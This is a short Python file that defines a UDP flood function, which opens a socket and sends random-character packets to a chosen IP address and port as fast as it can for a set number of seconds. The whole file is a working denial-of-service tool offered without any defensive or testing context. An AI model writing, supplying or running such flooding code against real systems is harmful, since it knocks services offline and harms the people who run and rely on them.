import socket
import random
import string
import time  

async def udp_flood(target_ip: str, target_port: int, message_size: int = 1024, duration: int = 60):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    message = ''.join(random.choices(string.ascii_letters + string.digits, k=message_size)).encode('utf-8')

    while time.time() < end_time:
        sock.sendto(message, (target_ip, target_port))
        print(f'Sent packet to {target_ip}:{target_port}')

    sock.close()
